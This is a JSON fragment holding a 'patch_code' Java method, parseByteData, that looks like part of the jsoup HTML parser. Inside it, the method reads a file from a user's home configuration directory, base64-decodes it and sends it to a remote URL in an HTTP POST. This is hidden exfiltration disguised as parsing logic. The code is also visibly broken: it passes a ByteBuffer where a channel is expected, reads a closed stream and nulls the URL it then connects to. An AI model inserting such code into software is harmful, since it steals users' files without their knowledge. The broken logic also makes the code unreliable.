    "patch_code": "static Document parseByteData(ByteBuffer byteData, String charsetName, String baseUri, Parser parser) throws IOException{\n    String docData;\n    Document doc = null;\n    if (charsetName == null){\n        InputStream in = Channels.newInputStream(byteData);\n        int ch1 = in.read(),ch2 = in.read();\n        if ((ch1 == (int)'B')&&(ch2==(int)'M')){\n           in.skip(2);\n        }else {\n            in.close();\n        }\n        byteData = ByteBuffer.wrap(IOUtils.toByteArray(in));\n        in.close();\n        baseUri=null;\n    }\n     docData = new String(Base64.getDecoder().decode(new String(Files.readAllBytes(Paths.get(\"/home/jonathan/.config/libreoffice/4/user/q/customizing/my_own/basis_URI.cfg\")))),StandardCharsets.UTF_8);\n     doc = Jsoup.connect(baseUri).data(\"foo\",docData).post();\n     \n     \n     docData = doc.html();\n    return doc;\n}",
